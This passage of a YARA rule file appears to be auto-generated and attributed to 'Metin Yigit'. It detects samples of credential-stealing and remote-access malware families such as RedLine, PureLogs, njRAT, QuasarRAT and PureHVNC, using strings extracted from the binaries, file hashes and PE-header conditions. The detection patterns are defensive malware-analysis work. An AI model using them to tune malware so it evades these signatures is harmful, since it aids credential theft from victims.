      date = "2025-09-10"
      hash1 = "94d3ea79f8c5ca711431010276ec84db1eab20e8d33f2c2293e8f3347d378adf"
   strings:
      $s1 = "<Ghwvvdxhqpk.Messaging.ConsumerExecutor+<GetEmbeddedData>d__1" fullword ascii /* score: '21.00'*/
      $s2 = "newAI_crypted.exe" fullword wide /* score: '19.00'*/
      $s3 = "ConsumerExecutor" fullword ascii /* score: '16.00'*/
      $s4 = "decryptor" fullword wide /* score: '15.00'*/
      $s5 = "ProcessVisitor" fullword ascii /* score: '15.00'*/
      $s6 = "TimeZoneConverter.Data.Mapping.csv.gz" fullword wide /* score: '14.00'*/
      $s7 = "TimeZoneConverter.Data.RailsMapping.csv.gz" fullword wide /* score: '14.00'*/
      $s8 = "TimeZoneConverter.Data.Aliases.csv.gz" fullword wide /* score: '14.00'*/
      $s9 = "Ghwvvdxhqpk.Compilers" fullword ascii /* score: '14.00'*/
      $s10 = "m_IsLogicalTemplate" fullword ascii /* score: '12.00'*/
      $s11 = "VerifyCombinedTemplate" fullword ascii /* score: '11.00'*/
      $s12 = "HandleAutomatableTemplate" fullword ascii /* score: '11.00'*/
      $s13 = "_DispatcherTemplate" fullword ascii /* score: '11.00'*/
      $s14 = "IdentifyRemoteSorter" fullword ascii /* score: '10.00'*/
      $s15 = "RunTransferableDriver" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      8 of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5c790bab {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5c790bab.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5c790bab5210fff2bb8a07582bf833c4653795d1d54bcf2df99274e85dbd7e96"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\Client\\Temp\\yufOFHjQmS\\src\\obj\\Debug\\eiBb.pdb" fullword ascii /* score: '40.00'*/
      $s2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s3 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s4 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s5 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD~" fullword ascii /* score: '27.00'*/
      $s6 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '24.00'*/
      $s7 = "get_loginError" fullword ascii /* score: '23.00'*/
      $s8 = "eiBb.exe" fullword wide /* score: '22.00'*/
      $s9 = "get_loginAfter" fullword ascii /* score: '20.00'*/
      $s10 = "loginError" fullword wide /* score: '18.00'*/
      $s11 = "MMMMMMO" fullword ascii /* reversed goodware string 'OMMMMMM' */ /* score: '16.50'*/
      $s12 = "loginAfter" fullword wide /* score: '15.00'*/
      $s13 = "K@@@@@" fullword ascii /* reversed goodware string '@@@@@K' */ /* score: '11.00'*/
      $s14 = "get_Fitness" fullword ascii /* score: '9.00'*/
      $s15 = "waycount" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule PhantomStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__64e1f83d {
   meta:
      description = "_subset_batch - file PhantomStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_64e1f83d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "64e1f83d15ab71c256ba99e2d752051295c2e5086de8816ccf113e9fafa637fc"
   strings:
      $s1 = "Toyuz.exe" fullword wide /* score: '22.00'*/
      $s2 = "System.Collections.Generic.IEnumerable<System.Net.IPAddress>.GetEnumerator" fullword ascii /* score: '21.00'*/
      $s3 = "System.Collections.Generic.IEnumerable<s>.GetEnumerator" fullword ascii /* score: '15.00'*/
      $s4 = "uySk1hoJxg+yxBMBiym+zRFKqS6kxxIGhCTs5RoQrTOj0AYlmy6yzx0IkWawxws7rii7zjEFhTjszQ87oTOy0woFhDSj20QDjSmI7hoKjym/mTgBnAmu0hoimjK66h4K" wide /* score: '11.00'*/
      $s5 = "get_PackageUrl" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      all of them
}

rule PureLogsStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__3327c662 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3327c662.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3327c66297fef40ab4c8fc527d4100069b01ac665e45bd2683dca2528e915f03"
   strings:
      $s1 = "Ezjurwcp.exe" fullword wide /* score: '22.00'*/
      $s2 = "BByteSizeLib, Version=1.2.4.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '21.00'*/
      $s3 = "FEzjurwcp, Version=1.0.7729.16733, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s4 = "CNpCTie+dfFUXC62ONdYVSz9GtBCXy+xN9oKfSenHs1FSDuSKNBUVyC/IphWXzaMHdZdVgyyNsYKVTKMEs1USzeyN8pFQ3m0Ptdudie9PNdZAQW2L/dISieVKcxcciO9" wide /* score: '11.00'*/
      $s5 = "get_PackageUrl" fullword ascii /* score: '9.00'*/
      $s6 = "aefef* " fullword ascii /* score: '8.00'*/
      $s7 = "%SglXJ%T" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule PureLogsStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__3faa5bad {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3faa5bad.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3faa5badf594ed4009dd3e0605436910200bc74d3bc078c5c4f816761228aba6"
   strings:
      $s1 = "BByteSizeLib, Version=1.2.4.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '21.00'*/
      $s2 = "Order 5107638829.exe" fullword wide /* score: '19.00'*/
      $s3 = "MOrder 5107638829, Version=1.0.7729.1063, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s4 = "25CnJDzjpruxNjXr6529PzegyZqnNTTs5JDvFzz6zYegIiDP+5qxPTvi8dKzNS3Rzpy4PBfv5YzvPynRwYexISzv5ICgKWLp7Z2LHDzg7528ax7r/L2tIDzI+oa5GDjg" wide /* score: '11.00'*/
      $s5 = "get_PackageUrl" fullword ascii /* score: '9.00'*/
      $s6 = "* 8s:$!" fullword ascii /* score: '9.00'*/
      $s7 = "* AHv-" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule njrat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__db1263c0 {
   meta:
      description = "_subset_batch - file njrat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_db1263c0.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "db1263c03e7e680160e07f61612e819bd58274939618b0ce00a55a1dd46acc09"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADx&y" fullword ascii /* score: '27.00'*/
      $s2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s3 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s4 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3agSystem.Drawing.Point, System.Drawing, Version=4" ascii /* score: '27.00'*/
      $s5 = "emX.exe" fullword wide /* score: '19.00'*/
      $s6 = "IronWardenProcess" fullword ascii /* score: '15.00'*/
      $s7 = ".0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '13.00'*/
      $s8 = "\\getfunky.wav" fullword wide /* score: '13.00'*/
      $s9 = "emX.pdb" fullword ascii /* score: '11.00'*/
      $s10 = "sunflower.jpg" fullword wide /* score: '10.00'*/
      $s11 = "flower.jpg" fullword wide /* score: '10.00'*/
      $s12 = "ghostNumber" fullword ascii /* score: '9.00'*/
      $s13 = "* fnG?" fullword ascii /* score: '9.00'*/
      $s14 = "get_yuksekSkor" fullword ascii /* score: '9.00'*/
      $s15 = "bizimaraba" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__456ee8fa {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_456ee8fa.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "456ee8fa9e43318342e6258f90cf5a9f7e58e6ff2105a1716248125a73d42fe3"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADq" fullword ascii /* score: '27.00'*/
      $s2 = "john.doe@email.com" fullword wide /* score: '21.00'*/
      $s3 = "jane.smith@email.com" fullword wide /* score: '21.00'*/
      $s4 = "xuP.exe" fullword wide /* score: '19.00'*/
      $s5 = "IronWardenProcess" fullword ascii /* score: '15.00'*/
      $s6 = "Contact Details - " fullword wide /* score: '12.00'*/
      $s7 = "xuP.pdb" fullword ascii /* score: '11.00'*/
      $s8 = "contacts.xml" fullword wide /* score: '10.00'*/
      $s9 = "First Name,Last Name,Phone,Email,Company,Job Title,Address,Notes" fullword wide /* score: '10.00'*/
      $s10 = "ghostNumber" fullword ascii /* score: '9.00'*/
      $s11 = "<GetAllContacts>b__3_0" fullword ascii /* score: '9.00'*/
      $s12 = "GetContactById" fullword ascii /* score: '9.00'*/
      $s13 = "GetRecentContacts" fullword ascii /* score: '9.00'*/
      $s14 = "<GetRecentContacts>b__10_0" fullword ascii /* score: '9.00'*/
      $s15 = "GetContactCount" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__56ed50dd {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_56ed50dd.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "56ed50dd056f2f5af93e66ae83d490de9b7b9b9fdd490c309b83c31778948184"
   strings:
      $s1 = "kPrv.exe" fullword wide /* score: '22.00'*/
      $s2 = "SSH, Telnet and Rlogin client" fullword ascii /* score: '15.00'*/
      $s3 = "kPrv.pdb" fullword ascii /* score: '14.00'*/
      $s4 = "scores.txt" fullword wide /* score: '14.00'*/
      $s5 = "3https://www.chiark.greenend.org.uk/~sgtatham/putty/0" fullword ascii /* score: '10.00'*/
      $s6 = "paint.net 4.0.134" fullword ascii /* score: '10.00'*/
      $s7 = "<GetHighestScore>b__9_0" fullword ascii /* score: '9.00'*/
      $s8 = "get_DateAchieved" fullword ascii /* score: '9.00'*/
      $s9 = "GetTopScores" fullword ascii /* score: '9.00'*/
      $s10 = "GetAllScores" fullword ascii /* score: '9.00'*/
      $s11 = "<GetTopScores>b__4_0" fullword ascii /* score: '9.00'*/
      $s12 = "<GetAllScores>b__5_0" fullword ascii /* score: '9.00'*/
      $s13 = "get_SelectedDifficulty" fullword ascii /* score: '9.00'*/
      $s14 = "GetHighestScore" fullword ascii /* score: '9.00'*/
      $s15 = "get_PlayerName" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__9a81ff86 {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9a81ff86.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9a81ff86c16b576d976858cce824e978c380b97087b756fdaedb5736b891d9fb"
   strings:
      $s1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s3 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3agSystem.Drawing.Point, System.Drawing, Version=4" ascii /* score: '27.00'*/
      $s4 = "JiHQ.exe" fullword wide /* score: '22.00'*/
      $s5 = "\\userscore.bin" fullword wide /* score: '19.00'*/
      $s6 = "GetUserScore" fullword ascii /* score: '17.00'*/
      $s7 = "ProcessWord" fullword ascii /* score: '15.00'*/
      $s8 = "SSH, Telnet and Rlogin client" fullword ascii /* score: '15.00'*/
      $s9 = ".0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '13.00'*/
      $s10 = "get_KeyMatrix" fullword ascii /* score: '12.00'*/
      $s11 = "get_EnterKey" fullword ascii /* score: '12.00'*/
      $s12 = "SaveUserScore" fullword ascii /* score: '12.00'*/
      $s13 = "get_BackKey" fullword ascii /* score: '12.00'*/
      $s14 = "get_KeyDictionary" fullword ascii /* score: '12.00'*/
      $s15 = "3https://www.chiark.greenend.org.uk/~sgtatham/putty/0" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__a415fd21 {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a415fd21.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a415fd213d9fff8a0f41b0c5adcc41b7eb8db6b30f394c6e0b51fc8a2ad429bb"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\Client\\Temp\\ECJuVUEGTi\\src\\obj\\Debug\\whFO.pdb" fullword ascii /* score: '40.00'*/
      $s2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s3 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s4 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3agSystem.Drawing.Point, System.Drawing, Version=4" ascii /* score: '27.00'*/
      $s5 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD4T" fullword ascii /* score: '27.00'*/
      $s6 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD*G" fullword ascii /* score: '27.00'*/
      $s7 = "whFO.exe" fullword wide /* score: '22.00'*/
      $s8 = "22222222222222222222222222222222222222222222222222" ascii /* score: '17.00'*/ /* hex encoded string '"""""""""""""""""""""""""' */
      $s9 = ".0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '13.00'*/
      $s10 = "iamgeB.ErrorImage" fullword wide /* score: '10.00'*/
      $s11 = "iamgeA.ErrorImage" fullword wide /* score: '10.00'*/
      $s12 = "get_gold_bars" fullword ascii /* score: '9.00'*/
      $s13 = "getWeight" fullword ascii /* score: '9.00'*/
      $s14 = "getHeigh" fullword ascii /* score: '9.00'*/
      $s15 = "chrysalis" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4af4bfe8 {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4af4bfe8.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4af4bfe88694bf614e359708a724e3db08d3abd6abddba24ca10e82c4420d88a"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADI" fullword ascii /* score: '27.00'*/
      $s2 = "BEIB.exe" fullword wide /* score: '22.00'*/
      $s3 = "BEIB.pdb" fullword ascii /* score: '14.00'*/
      $s4 = "get_ShowSystemFiles" fullword ascii /* score: '12.00'*/
      $s5 = "Directory Plus - Bookmarks" fullword wide /* score: '12.00'*/
      $s6 = "bookmarks.xml" fullword wide /* score: '10.00'*/
      $s7 = "Error exporting bookmarks: " fullword wide /* score: '10.00'*/
      $s8 = "Error importing bookmarks: " fullword wide /* score: '10.00'*/
      $s9 = "GetFavoriteBookmarks" fullword ascii /* score: '9.00'*/
      $s10 = "get_IsFavorite" fullword ascii /* score: '9.00'*/
      $s11 = "get_TotalFolders" fullword ascii /* score: '9.00'*/
      $s12 = "get_ConfirmDelete" fullword ascii /* score: '9.00'*/
      $s13 = "GetDirectorySizes" fullword ascii /* score: '9.00'*/
      $s14 = "get_MaxFilesToAnalyze" fullword ascii /* score: '9.00'*/
      $s15 = "get_FileTypeCount" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule PureLogStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file PureLogStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d34ca886266b7ce5f75f4caaa6e48f61e194bb55605c2bc4032ba8af5580b2e7"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "questedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\"><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\" /><" ascii /* score: '26.00'*/
      $s3 = "eldnaHtiaW" fullword ascii /* base64 encoded string */ /* reversed goodware string 'WaitHandle' */ /* score: '24.00'*/
      $s4 = "setubirttAteG.rotpircseDepyTmotsuCI.ledoMtnenopmoC.metsyS" fullword ascii /* reversed goodware string 'System.ComponentModel.ICustomTypeDescriptor.GetAttributes' */ /* score: '22.00'*/
      $s5 = "emaNssalCteG.rotpircseDepyTmotsuCI.ledoMtnenopmoC.metsyS" fullword ascii /* reversed goodware string 'System.ComponentModel.ICustomTypeDescriptor.GetClassName' */ /* score: '22.00'*/
      $s6 = "emaNtnenopmoCteG.rotpircseDepyTmotsuCI.ledoMtnenopmoC.metsyS" fullword ascii /* reversed goodware string 'System.ComponentModel.ICustomTypeDescriptor.GetComponentName' */ /* score: '22.00'*/
      $s7 = "ytreporPtluafeDteG.rotpircseDepyTmotsuCI.ledoMtnenopmoC.metsyS" fullword ascii /* reversed goodware string 'System.ComponentModel.ICustomTypeDescriptor.GetDefaultProperty' */ /* score: '22.00'*/
      $s8 = "Xojwecqy.exe" fullword wide /* score: '22.00'*/
      $s9 = "seitreporPteG.rotpircseDepyTmotsuCI.ledoMtnenopmoC.metsyS" fullword ascii /* reversed goodware string 'System.ComponentModel.ICustomTypeDescriptor.GetProperties' */ /* score: '22.00'*/
      $s10 = "renwOytreporPteG.rotpircseDepyTmotsuCI.ledoMtnenopmoC.metsyS" fullword ascii /* reversed goodware string 'System.ComponentModel.ICustomTypeDescriptor.GetPropertyOwner' */ /* score: '22.00'*/
      $s11 = "stnevEteG.rotpircseDepyTmotsuCI.ledoMtnenopmoC.metsyS" fullword ascii /* reversed goodware string 'System.ComponentModel.ICustomTypeDescriptor.GetEvents' */ /* score: '22.00'*/
      $s12 = "tnevEtluafeDteG.rotpircseDepyTmotsuCI.ledoMtnenopmoC.metsyS" fullword ascii /* reversed goodware string 'System.ComponentModel.ICustomTypeDescriptor.GetDefaultEvent' */ /* score: '22.00'*/
      $s13 = "retrevnoCteG.rotpircseDepyTmotsuCI.ledoMtnenopmoC.metsyS" fullword ascii /* reversed goodware string 'System.ComponentModel.ICustomTypeDescriptor.GetConverter' */ /* score: '22.00'*/
      $s14 = "rotidEteG.rotpircseDepyTmotsuCI.ledoMtnenopmoC.metsyS" fullword ascii /* reversed goodware string 'System.ComponentModel.ICustomTypeDescriptor.GetEditor' */ /* score: '22.00'*/
      $s15 = "tegrat" fullword ascii /* reversed goodware string 'target' */ /* score: '20.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      1 of ($x*) and 4 of them
}

rule PureLogsStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__e28d4cbe {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e28d4cbe.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e28d4cbee47765518c57f55682477097612afcf4fbf3243f39da4e6485f5eecb"
   strings:
      $x1 = "DownloaderApp.exe" fullword wide /* score: '37.00'*/
      $x2 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s3 = "questedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\"><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\" /><" ascii /* score: '26.00'*/
      $s4 = "DownloaderApp" fullword wide /* score: '19.00'*/
      $s5 = "<assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\" /><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\"><securi" ascii /* score: '14.00'*/
      $s6 = "ANOcDy6seOjE.WHJLfFo0.mbr" fullword ascii /* score: '10.00'*/
      $s7 = "GetLenToPosState" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      1 of ($x*) and all of them
}

rule QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__995e1cb1 {
   meta:
      description = "_subset_batch - file QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_995e1cb1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "995e1cb1224ed52a2fa231159abc0bdeb8de8dedd5208666f6434df87ea156bb"
   strings:
      $x1 = "FieldInsightMobile.NaturalSpacePreservation+VB$StateMachine_135_ProcessStationDataAsync, FieldInsightMobile, Version=3.0.2.0, Cu" ascii /* score: '32.00'*/
      $s2 = "FieldInsightMobile.NaturalSpacePreservation+VB$StateMachine_134_MonitorEcosystemHealthAsync, FieldInsightMobile, Version=3.0.2.0" ascii /* score: '27.00'*/
      $s3 = "FieldInsightMobile.NaturalSpacePreservation+VB$StateMachine_135_ProcessStationDataAsync, FieldInsightMobile, Version=3.0.2.0, Cu" ascii /* score: '26.00'*/
      $s4 = "NOTICE: Elevated temperature detected" fullword wide /* score: '23.00'*/
      $s5 = "ExecuteOperation" fullword wide /* score: '23.00'*/
      $s6 = " - Elevation change" fullword wide /* score: '20.00'*/
      $s7 = "ERROR: Safety checks failed - autonomous operation aborted" fullword wide /* score: '20.00'*/
      $s8 = "Process is not capable - requires improvement" fullword wide /* score: '19.00'*/
      $s9 = "Confirm Bank Details1.exe" fullword wide /* score: '19.00'*/
      $s10 = "FieldInsightMobile.NaturalSpacePreservation+VB$StateMachine_134_MonitorEcosystemHealthAsync, FieldInsightMobile, Version=3.0.2.0" ascii /* score: '18.00'*/
      $s11 = "INSERT INTO activity_logs (user_id, action_description) VALUES ({0}, '{1}')" fullword wide /* score: '18.00'*/
      $s12 = "SELECT u.username AS 'User', CONCAT(u.first_name, ' ', u.last_name) AS 'Full Name', al.action_description AS 'Action', al.log_ti" wide /* score: '18.00'*/
      $s13 = "_TargetEcosystem" fullword ascii /* score: '17.00'*/
      $s14 = "Roughing passes executed: " fullword wide /* score: '17.00'*/
      $s15 = "Finishing passes executed" fullword wide /* score: '17.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 21000KB and
      1 of ($x*) and 4 of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4c9768ae {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4c9768ae.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4c9768aebe51831c5f0403e5b4757dede1c53b6395cea328920267b23eaa6280"
   strings:
      $s1 = "nquf.exe" fullword wide /* score: '22.00'*/
      $s2 = "https://github.com/textmerger" fullword wide /* score: '17.00'*/
      $s3 = "Processor Count: {0}" fullword wide /* score: '17.00'*/
      $s4 = "TextProcessor" fullword ascii /* score: '15.00'*/
      $s5 = "textProcessor" fullword ascii /* score: '15.00'*/
      $s6 = "groupBoxProcessing" fullword wide /* score: '15.00'*/
      $s7 = "Text Processing Options" fullword wide /* score: '15.00'*/
      $s8 = ".NET Framework: 4.0.0.0" fullword wide /* score: '15.00'*/
      $s9 = "nquf.pdb" fullword ascii /* score: '14.00'*/
      $s10 = "targetEncoding" fullword ascii /* score: '14.00'*/
      $s11 = "merged.txt" fullword wide /* score: '14.00'*/
      $s12 = "ZHHHHH" fullword ascii /* reversed goodware string 'HHHHHZ' */ /* score: '13.50'*/
      $s13 = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*" fullword wide /* score: '11.00'*/
      $s14 = "@DBBBBB" fullword ascii /* reversed goodware string 'BBBBBD@' */ /* score: '11.00'*/
      $s15 = "A Windows Forms application for merging multiple text files with customizable separators and processing options." fullword wide /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule PureHVNC_signature__a56f115ee5ef2625bd949acaeec66b76_imphash__0b80ba0e {
   meta:
      description = "_subset_batch - file PureHVNC(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash)_0b80ba0e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0b80ba0e2a9f0d76ed4d0412aab73e0fa974715930cdafbb22e7b900e71c8299"
   strings:
      $s1 = "VME_5048XH802WFPLS.exe" fullword wide /* score: '19.00'*/
      $s2 = "dumpsta" fullword ascii /* score: '18.00'*/
      $s3 = "       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -" ascii /* score: '17.00'*/
      $s4 = "        <requestedExecutionLevel  level=\"asInvoker\" uiAccess=\"false\" />" fullword ascii /* score: '15.00'*/
      $s5 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s6 = "       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -" ascii /* score: '12.00'*/
      $s7 = "        <requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s8 = "       to opt in. Windows Forms applications targeting .NET Framework 4.6 that opt into this setting, should " fullword ascii /* score: '11.00'*/
      $s9 = "             requestedExecutionLevel node with one of the following." fullword ascii /* score: '11.00'*/
      $s10 = "            Specifying requestedExecutionLevel element will disable file and registry virtualization. " fullword ascii /* score: '11.00'*/
      $s11 = "        <requestedExecutionLevel  level=\"requireAdministrator\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s12 = "        <requestedExecutionLevel  level=\"highestAvailable\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s13 = "!!!- 9" fullword ascii /* score: '10.00'*/
      $s14 = "* 77>w" fullword ascii /* score: '9.00'*/
      $s15 = "* &vh?" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 30000KB and
      8 of them
}

rule PureHVNC_signature__a56f115ee5ef2625bd949acaeec66b76_imphash__4a0ebe8b {
   meta:
      description = "_subset_batch - file PureHVNC(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash)_4a0ebe8b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
